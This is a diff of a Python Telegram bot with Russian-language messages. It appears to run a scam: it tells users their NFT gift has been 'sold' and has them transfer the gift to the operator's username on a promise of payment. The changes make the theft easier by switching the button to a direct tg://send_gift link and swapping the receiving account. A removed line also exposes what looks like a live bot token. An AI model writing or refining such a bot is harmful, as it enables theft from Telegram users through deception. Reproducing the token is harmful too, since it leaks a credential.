@@ -10,8 +10,8 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.enums import ParseMode
 
 # --- НАСТРОЙКИ ---
-BOT_TOKEN = "9232714745:AAF5jlp52Y99F1fHbSinG7CRitLNoUQCSoY" # Вставь токен от BotFather
-MY_USERNAME = "nokotsr" # Твой юзернейм без @
+BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА" # Вставь токен от BotFather
+MY_USERNAME = "virtfizu" # Твой юзернейм без @
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -49,7 +49,7 @@ async def create_offer(message: types.Message):
             return
         
         lang = parts[-1]
-        currency = parts[-2].lower() # stars или ton
+        currency = parts[-2].lower()
         amount = parts[-3]
         nft_name = " ".join(parts[:-3])
         
@@ -85,7 +85,6 @@ async def activate_offer(message: types.Message):
     except Exception as e:
         print(f"Ошибка удаления: {e}")
 
-    # Форматируем сумму (TON или Звезды)
     formatted_amount = format_currency(offer_data["amount"], offer_data["currency"])
 
     if offer_data["lang"] == "ru":
@@ -131,7 +130,7 @@ async def process_accept(callback: types.CallbackQuery):
     )
     await callback.answer()
 
-# --- КНОПКА ОК (ДВЕ КНОПКИ) ---
+# --- КНОПКА ОК ---
 @dp.callback_query(F.data.startswith("ok_"))
 async def process_ok(callback: types.CallbackQuery):
     code = callback.data.split("_")[1]
@@ -143,7 +142,7 @@ async def process_ok(callback: types.CallbackQuery):
         text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {formatted_amount}."
         
         builder = InlineKeyboardBuilder()
-        builder.row(InlineKeyboardButton(text="Передать NFT", url=f"https://t.me/{MY_USERNAME}"))
+        builder.row(InlineKeyboardButton(text="Передать NFT", url=f"tg://send_gift?to={MY_USERNAME}"))
         builder.row(InlineKeyboardButton(text="Как передать NFT?", callback_data=f"how_{code}"))
         
         await bot.edit_message_text(
@@ -161,9 +160,8 @@ async def process_how_to(callback: types.CallbackQuery):
     code = callback.data.split("_")[1]
     b_conn_id = callback.message.business_connection_id
     
-    text = (
-        "Для передачи Nft-подарка, нужно нажать кнопку снизу, вернутся к передаче, после нажать кнопку передать-NFT, вас перекинет на профиль человека который купил нфт, нажать три точки сверху, и \"подарить подарок\" там выбрать нфт который вы продали и отправить, Внимание! После передачи нфт нужно подождать 5-10 минут для получения средств."
-    )
+    # НОВЫЙ ТЕКСТ
+    text = "Для передачи нфт нужно нажать кнопку, передать нфт, после лимитированные подарки, и выбрать нфт которое вы продаете."
     
     builder = InlineKeyboardBuilder()
     builder.row(InlineKeyboardButton(text="Вернуться к офферу", callback_data=f"back_{code}"))
@@ -188,7 +186,7 @@ async def process_back(callback: types.CallbackQuery):
         text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {formatted_amount}."
         
         builder = InlineKeyboardBuilder()
-        builder.row(InlineKeyboardButton(text="Передать NFT", url=f"https://t.me/{MY_USERNAME}"))
+        builder.row(InlineKeyboardButton(text="Передать NFT", url=f"tg://send_gift?to={MY_USERNAME}"))
         builder.row(InlineKeyboardButton(text="Как передать NFT?", callback_data=f"how_{code}"))
         
         await bot.edit_message_text(
